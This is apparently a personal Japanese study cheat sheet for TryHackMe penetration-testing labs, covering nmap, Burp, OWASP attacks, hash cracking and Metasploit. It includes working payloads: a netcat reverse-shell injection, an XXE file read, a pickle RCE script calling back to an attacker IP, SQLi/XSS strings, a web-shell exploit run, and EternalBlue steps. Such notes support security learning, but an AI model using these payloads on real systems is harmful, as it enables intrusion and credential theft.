# TryHackMe メモ

## よく使うリンク

- exploit-db
  - <https://www.exploit-db.com/>
- Crontabジェネレーター
  - <https://crontab-generator.org/>
  - <https://crontab.guru/>
- [チートシート](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- ハッシュクラック
  - <https://crackstation.net/>
- [セキュリティ設定ミスのOWASPトップ10](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html)
- レインボークラック
  - <https://hashes.com/en/decrypt/hash>
- [パスワードプレフィックス検索ページ](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [ハッシュアナライザー](https://www.tunnelsup.com/hash-analyzer/)

## 隠しページを見つける

```bash
sudo apt install gobuster

gobuster -u {対象サイトURL} -w /usr/share/wordlists/dirb/common.txt dir

# word listは以下にデフォルトで格納されている
ll /usr/share/wordlists/
```

## DNS情報取得

```bash
nslookup --type=CNAME {対象サイトドメイン名}
nslookup --type=TXT {対象サイトドメイン名}
nslookup --type=MX {対象サイトドメイン名}
nslookup --type=A {対象サイトドメイン名}
```

## SCP

```bash
scp {送信したいファイル} {ユーザー}@{サーバIP}:{サーバ内フルパス}
```

## バックグラウンド実行

```bash
# Ctrl + z or 末尾に &
# フォアグランドに戻す
fg
```

## systemctl

```bash
systemctl [option] [service name]
# option: start, stop, enabled
```

## Crontab

- ジェネレーター
  - <https://crontab-generator.org/>
  - <https://crontab.guru/>

```bash
# 編集
crontab -e
# 参照
crontab -l
```

## パッケージ管理

```bash
# SublimeTextインストールをしたい場合
wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
# ファイル作成しリポジトリ情報を書き込む
# /etc/apt/sources.list.d/sublime-text.list
sudo apt update
sudo apt install sublime-text

# パーッケージ削除方法
sudo add-apt-repository --remove [ppa:PPA_Name/ppa]
sudo apt remove [software-name-here]
```

## Windows CMD

```bash
hostname
whoami
ipconfig
# ヘルプ表示
ipconfig /?
# 画面クリア
cls
# プロトコル統計、ネットワーク接続表示
netstat
# net系コマンド
net [user | localgroup | use | share | session]
```

## 悪意IP検索

- 有名サイトを調べてみる（以下は適当に検索したもの）
  - <https://www.abuseipdb.com/>

## アクセス

```bash
nc [target IP] [PORT]
```

## ping

- -4: v4
- -6: v6
- -i: 間隔指定
- -v: 詳細表示

## traceroute

- -i: インターフェース指定
- -T: プローブにTCP SYN使用

## whois

```bash
whois <domain>
```

## dig

ドメイン情報について、選択した再帰DNSサーバにクエリを実行する

```bash
dig <domain> @<dns-server-ip>
```

## nmap

- リッスンしているポートを調べる
- [ドキュメント](https://nmap.org/book/)

### nmapオプション

- スキャンタイプ
  - -sT: TCP
  - -sS: TCPSYN ハーフオープン（ステルス）
    - メリット
      - 古いタイプのIDS（侵入検知システム）にはかからない。最新でもかからないことはよくある。
      - TCPより大幅に高速
    - デメリット
      - sudo権限必要
      - 不安定なサービスはSYNスキャンで停止することがある。
  - -sU: UDP
    - 遅いため、ポートは絞る `--top-ports <number>` のがおすすめ。例） `nmap -sU --top-ports 20 <target>`
  - 一般的でないもの（SYNのステルススキャンよりもステルス性が高い）
    - -sN: Null
    - -sF: FIN
    - -sX: Xmax
    - 補足
      - UDP同様、「open|filtered, closed, or filtered」までしか識別できない。
      - ファイアウォールの回避が目的。多くのファイアウォールはSYNフラグを条件にドロップするので、SYN以外のフラグでファイアウォールをバイパスする。
      - 最新のIDSは対応されていることもある。
- -O: OSを検出
- -sV: サービスバージョン検出
- -v: 詳細出力
  - -vv: 詳細レベル2
  - -v3: 詳細レベル3
  - 補足: レベル2以上推奨
- -oA: 引数のbasenameで結果を保存する（3種類）
  - .nmap
  - .xml
  - .gnmap
- -oN: 通常の出力（標準出力そのまま）で保存
- -oG: grepable形式で保存
- -A: アグレッシブモード
  - OS検出（-O）、バージョンスキャン（-sV）、スクリプトスキャン（-sC）、およびtraceroute（--traceroute）
  - ターゲットの許可なく使用しないこと
- -T: -T5のようにタイミングテンプレートを指定
  - paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), insane (5)
  - 被害妄想の（0）、卑劣な（1）、礼儀正しい（2￼ ￼Search
You can enter a progra）、通常の（3）、攻撃的な（4）、非常識な（5）
  - 詳細
    - 最初の2つはIDS回避用です。ポライトモードでは、スキャンの速度が低下し、使用する帯域幅とターゲットマシンのリソースが少なくなります。
    - 通常モードがデフォルトであるため、 -T3 は何もしません。
    - アグレッシブモードは、適度に高速で信頼性の高いネットワーク上にいることを前提として、スキャンを高速化します。
    - 非常識なモードは、非常に高速なネットワーク上にいるか、速度のためにある程度の精度を犠牲にしても構わないと思っていることを前提としています。
  - 補足: 高速になるほどノイズが多くなりエラー率が高まる
- -p: ポート指定
  - -p 80
  - -p 1000-1500: 範囲指定
  - -p-: 全ポート指定
- --script: スクリプトスキャンを実行。Lua言語
- -sn: ICMPネットワークスキャン（pingスイープ）
  - nmap -sn 192.168.0.1-254（ハイフン）
  - nmap -sn 192.168.0.0/24（CIDER表記）

### nmapコマンド例

```bash
# Xmasスキャン
sudo nmap <TARGET IP> -sX -vv -Pn -p 1500-1510
# FTP匿名ログインチェック
sudo nmap -Pn --script=ftp-anon.nse <TARGET IP> -p 21
```

### Nmap Scripting Engine(NSE)

- カテゴリ例
  - safe: ターゲットに影響を与えません
  - intrusive: 安全ではありません。ターゲットに影響を与える可能性があります
  - vuln: 脆弱性をスキャンする
  - exploit: 脆弱性を悪用しようとする
  - auth: 実行中のサービスの認証をバイパスしようとします（たとえば、FTPサーバーに匿名でログインします）
  - brute: サービスを実行するためのブルートフォース認証を試みます
  - discovery: ネットワークに関する詳細情報について、実行中のサービスにクエリを実行してみてください（SNMPサーバーにクエリを実行するなど）。
- スクリプトと引数
  - スクリプトと引数の例 <https://nmap.org/nsedoc/>
  - `<script-name>.<argument>`
- 検索方法

  ```bash
  # インストール済みスクリプト検索
  grep "ftp" /usr/share/nmap/scripts/script.db
  ll /usr/share/nmap/scripts/*ftp*
  # カテゴリ検索
  grep "safe" /usr/share/nmap/scripts/script.db
  ```

- スクリプトインストール

  ```bash
  sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse
  ```

### ファイアウォール回避

- -Pn: スキャン前にpingを送信しないようにする
  - 時間がかかる可能性
- -f: パケットを断片化する
- `--mtu <number>`: -fより細かくパケットサイズを指定できる
- `--scan-delay <time>ms`: パケット間隔を追加
  - ネットワークが不安定なとき
  - timeベースファイアウォール／IDSトリガー対策
- --badsum: パケットの無効なチェックサムを生成
  - TCP/IPスタックはドロップするが、ファイアウォールは自動的に応答する可能性があるので、ファイアウォール／IDSの存在を判別できる
- --data-length: パケットの最後にランダムデータを追加する
  - スキャンをいくらか目立たなくする（処理速度は遅くなる）

## WireShark

### フィルタ

- フィルタ演算子
  - and / &&
  - or / ||
  - eq / ==
  - ne / !=
  - gt /  >
  - llt / <
- 基本的なフィルタリング
  - `ip.addr == <IP Address>`: ソースor宛先IPで絞る
  - `ip.src == <SRC IP Address> and ip.dst == <DST IP Address>`: ソースと宛先で絞る
  - `tcp.port eq <Port #> or <Protocol Name>`: ポートやプロトコルで絞る
- 例
  - `arp && eth.addr == <MACアドレス> && arp.opcode == 2`: ARPパケットの対象MACアドレス端末のReplyで絞り、IPを確認する

### WireSharkその他機能

- 統計 > プロトコル階層
- 統計 > 終端（エンドポイント）
  - キャプチャ内のエンドポイントとIPを取得
- ファイル > オブジェクトのエクスポート > HTML
- HTTPS復号
  - 編集 > 設定 > Protocols > TLS
    - RSA keys list（編集ボタン）
      - IP address: 127.0.0.1
      - Port: start_tls
      - Protocol: http
      - Key FIle: .keyファイルのパス

## Burp Suite

### Proxyタブ

- Options
  - Intercept Client Responses
    - And: URL: Is in target scope: scopeに追加されたURLをプロキシがインターセプトしないようにする
  - Intercept Server Responses
    - Intercept responses based on the following rules: ON
      - 以下をON
      - Or: Request: Was intercepted
      - And: URL: Is in target scope
  - Match and Replace: 正規表現で絞り込む

### Burpテクニック

- `Ctrl+U`: Intercept中に範囲選択した文字をURLエンコードする

## OWASP

- Open Web Application Security Project
  - セキュリティを向上させることを専門とした非営利団体

### OSコマンドインジェクション

- [チートシート](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

```bash
;nc -e /bin/bash
```

#### 試したいコマンド

- Linux
  - whoami
  - id
  - ifconfig/ip addr
  - uname -a
  - ps -ef
  - その他コマンド
    - cat /etc/passwd: ユーザリスト
- Windows
  - whoami
  - ver
  - ipconfig
  - tasklist
  - netstat -an

### ハッシュクラック

- オンラインツール
  - <https://crackstation.net/>

### XML外部実態攻撃

#### XXE

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
<userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
</userInfo>

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

### IDOR(Insecure Direct Object Reference)

- <https://example.com/bank?account_number=1234>が得られたとき、パラメータを手動でずらして試す

### セキュリティ設定ミス

- [セキュリティ設定ミスのOWASPトップ10](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html)

### XSS

- Stored XSS
- Reflected XSS
- DOM-Based XSS

```html
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
<script>document.getElementById("thm-title").innerText = "I am a hacker"</script>
```

### Insecure Deserialization

`picklme.py`

```py
import base64
import pickle

command = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f"


class rce(object):
    def __reduce__(self):
        import os

        return (os.system, (command,))


print(base64.b64encode(pickle.dumps(rce())))
```

## 既知の脆弱性

```bash
searchsploit "online book store"

# 検索結果に[Unauthenticated Remote Code Execution（RCE）]がある。コピーして使用する。
cp /usr/share/exploitdb/exploits/php/webapps/47887.py .

# ヘルプで使い方を確認する
python 47887.py -h
# usage: 47887.py [-h] url
# positional arguments:
#   url         The URL of the target.
# options:
#   -h, --help  show this help message and exit

# URLを引数に指定するとリモートログインできる
python 47887.py <url>
# > Attempting to upload PHP web shell...
# > Verifying shell upload...
# > Web shell uploaded to http://<url>/bootstrap/img/UIX0yX0eck.php
# > Example command usage: http://<url>/bootstrap/img/UIX0yX0eck.php?cmd=whoami
# > Do you wish to launch a shell here? (y/n): y
# RCE $
```

### SQLインジェクション

```bash
' or 1=1--

bender@juice-sh.op'--
```

### ブルートフォース

```bash
sudo apt install seclists
# 以下の辞書をペイロードに指定する
/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
```

- [403 Error: Only .md and .pdf files are allowed!]エラー対策
  - <http://hostname/ftp/package.json.bak%2500.md>のように[%2500.md]でバイパスする
    - Poison Null Byte: %2500

### XSS例

```bash
<iframe src="javascript:alert(`xss`)">

<script>alert(`xss`)</script>
```

## 暗号

- [パスワードプレフィックス検索ページ](https://hashcat.net/wiki/doku.php?id=example_hashes)
- hashcat
  - --forceは使用しないこと。間違ったPWや誤スキップすることがある。
- [ハッシュアナライザー](https://www.tunnelsup.com/hash-analyzer/)
- /usr/share/wordlists/rockyou.txt.gz を解凍する
  - gzip -d -k /usr/share/wordlists/rockyou.txt.gz
    - /usr/share/wordlists/rockyou.txt が生成される

|           Prefix            |                         Algorithm                          |
| --------------------------- | ---------------------------------------------------------- |
| $1$                         | md5crypt, used in Cisco stuff and older Linux/Unix systems |
| $2$, $2a$, $2b$, $2x$, $2y$ | Bcrypt (Popular for web applications)                      |
| $6$                         | sha512crypt (Default for most Linux/Unix systems)          |

### ハッシュクラック手順

```bash
# bcryptの番号を取得（3200）
hashcat -h | grep bcrypt
# もしくは、https://hashcat.net/wiki/doku.php?id=example_hashes

# result.txtに結果が記入される。末尾の":"のあとの文字列
hashcat -m 3200 -a 0 -o ./result.txt ./hash.txt /usr/share/wordlists/rockyou.txt
# cat ~/.local/share/hashcat/hashcat.potfile でも確認可（result.txtを指定しない場合）
```

## John The Ripper

- 一番人気はJumboJohn

### ワードリスト

- システム別のコレクション: <https://github.com/danielmiessler/SecLists>
- /usr/share/wordlists/ ディレクトリ
- rockyou.txt
  - KaliLinuxのローカルから: tar xvzf /usr/share/wordlists/rockyou.txt.gz
  - リポジトリから: <https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz>

### John実行

```bash
# 基本構文
john [options] [path to file]

# ワードリストあり
john --wordlist=[path to wordlist] [path to file]
# 例
john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
```

### ハッシュの識別

- <https://hashes.com/en/tools/hash_identifier>
- <https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master>
  - `wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py`
  - python3 hash-id.py [hash]
  - python ~/data/ctf-tools/tools/hash-id.py（本Privateリポジトリにコピーした）

```bash
# クラック実行
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt ./hash1.txt
# 結果表示
john --show --format=Raw-MD5 ./hash1.txt
# 対応フォーマット一覧
```

### /etc/shadow ハッシュクラッキング

```bash
unshadow [path to passwd] [path to shadow]
# 例
unshadow ./password ./shadow > unshadow.txt
```

### Single Crack Mode

- Word Mangling: 辞書掲載の文字列を少しづつ変更して試す
- GECOS: shadowやpasswdの:::の区切りの各フィールドの情報を取得してワードリストに追加

```bash
john --single --format=[format] [path to file]
# 例
john --single --format=raw-sha256 hashes.txt

# Single Crack Modeでは、ハッシュの先頭にユーザ名を指定する
# From:
# 1efee03cdcb96d90ad48ccc7b8666033
# To
# mike:1efee03cdcb96d90ad48ccc7b8666033
```

### Custom Rules

- /etc/john/john.conf で定義する
- [List.Rules:THMRules]がカスタム定義用
  - cAz"[0-9] [!£$%@]"
    - 大文字
    - 番号
    - 記号

```bash
# [List.Rules:PoloPassword]
# cAz"[0-9] [!£$%@]"

john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]
```

### パスワード保護されたzipファイルのクラッキング

```bash
zip2john [options] [zip file] > [output file]
# 例
# ハッシュを取得する
zip2john secure.zip > zip_hash.txt
# パスワードを解析する
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
# パスワードを聞かれるので入力する
unzip secure.zip
```

### パスワード保護されたrarファイルのクラッキング

```bash
rar2john [rar file] > [output file]
# 例
rar2john secure.rar > rar_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt
unrar e secure.rar
```

### sshキーのクラッキング

```bash
ssh2john [id_rsa private key file] > [output file]
# 例
# ハッシュを取得
ssh2john idrsa.id_rsa > rsa_hash.txt
# パスワード解析
john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash.txt
```

## 暗号化

- CTFでRSA課題に使用するツール
  - <https://github.com/Ganapati/RsaCtfTool>
  - <https://github.com/ius/rsatool>
- 知っておくべき変数
  - p: 大きな素数
  - q: 同上
  - m: メッセージ（プレーンテキスト）
  - n: p*q
  - e: nとeで公開鍵
  - d: nとdで秘密鍵
  - c: 暗号文（暗号化されたテキスト）

## GPG

```bash
# 秘密鍵読み込み
gpg --import [secure key]
# 復号
gpg [gpg file]
# 鍵リスト
gpg --list-keys
gpg --delete-secret-keys [pub 記載の40文字程度のキー]
gpg --delete-keys [pub 記載の40文字程度のキー]
```

## 暗号化の推奨要件

- 非対称暗号化: RSA-3072以上
- 対称暗号化: AES-256以上
- 近い将来、量子コンピュータによりRSAや楕円曲線暗号は高速に破られる

## Metasploit

### Metasploitの主要バージョン

- Metasploit Pro: 商用。GUI
- Metasploit Framework: CLI。OSS
  - msfconsole
  - Modules
  - Tools

### Metasploitの主要コンポーネント

- Exploit: 脆弱性を突くコード
- Vulnerability: 脆弱性
- Payload: ターゲットシステムで実行されるコード

### Msfconsole

```bash
msfconsole

# EternalBlue（Windows用Exploit）
use exploit/windows/smb/ms17_010_eternalblue
# 使用中のコンテキストのオプションを表示
show options
# ペイロードリスト
show payloads

# コンテキストを抜ける
back

# コンテキストのモジュール詳細表示
info
# モジュールを指定して詳細表示
info exploit/windows/smb/ms17_010_eternalblue

# 関連モジュールを検索
search ms17-010
# 補助モジュールのみを検索
search type:auxiliary telnet
```

### Windows攻略例

```bash
use exploit/windows/smb/ms17_010_eternalblue
# 使用可能オプション確認
show options
set rhosts [target IP]
# Setされたか確認
show options
# Setしたオプションをクリア
unset rhosts # 指定
unset all # すべて

# グローバル設定（setg）：Metasploit終了 or ensetgでクリアするまで保持
setg rhosts [target IP]

# Exploit実行（zオプションはバックグランド実行）
exploit -z

# 悪用されることなく脆弱かをチェック（一部のモジュールが対応）
check
# セッションをバックグラウンド実行し、プロンプトに戻る
background
# Ctrl+zでバックグラウンドに戻る
# 任意のコンテキストからセッションを確認
sessions
# 指定IDのセッションに入る
sessions -i 2
```

### Metasploit: Exploit

- /usr/share/wordlists/metasploit/ にWordListがある

```bash
search portscan
# TCPポートスキャンを使用
use auxiliary/scanner/portscan/tcp
# 必要な情報をセット
set rhosts [target IP]
# 実行
run
# nmapでスキャン
# sudo nmap -sS [target IP]

# ポートスキャン
use auxiliary/scanner/portscan/tcp
# UDPサービス識別
use auxiliary/scanner/discovery/udp_sweep
# SMBスキャン
use auxiliary/scanner/smb/smb_version
# NetBIOS名確認
use auxiliary/scanner/netbios/nbname
# 対象ポートで実行されているサービス確認
use auxiliary/scanner/http/http_version
# SMBパスワード
auxiliary/scanner/smb/smb_login
```

### Metasploit DB

```bash
sudo systemctl start postgresql
sudo msfdb init
msfconsole
db_status
workspace
workspace -a [workspace name] # 追加
workspace -d [workspace name] # 削除
workspace [workspace name] # ワークスペース切り替え

# NmapスキャンがDBに保存される
db_nmap -sV -p- [target IP]
# ターゲットで実行されているホスト情報表示
hosts
# ターゲットで実行されているサービス情報表示
services
```

```bash
# ワークフロー
use auxiliary/scanner/smb/smb_ms17_010
hosts -R # db_nmapで保存された情報からRHOSTSをセットする

# NetBIOSサービスを検索する
services -S netbios
# HTTP, FTP, SMB, SSH, RDP を検索するのがおすすめ
```

